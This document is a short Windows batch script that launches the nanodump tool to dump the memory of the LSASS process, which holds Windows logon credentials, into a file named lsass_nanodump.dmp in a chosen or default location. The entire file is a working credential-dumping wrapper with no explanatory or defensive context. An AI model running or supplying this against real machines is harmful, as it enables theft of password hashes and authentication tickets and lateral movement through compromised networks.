@echo off
setlocal EnableDelayedExpansion

if "%~1"=="" goto :default

set OUTFILE=%~f1
if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_nanodump.dmp
goto :run

:default
set OUTFILE=%~dp0lsass_nanodump.dmp

:run
"%~dp0nanodump.x64.exe" --write "!OUTFILE!" --valid --fork
echo Done.
dir "!OUTFILE!"
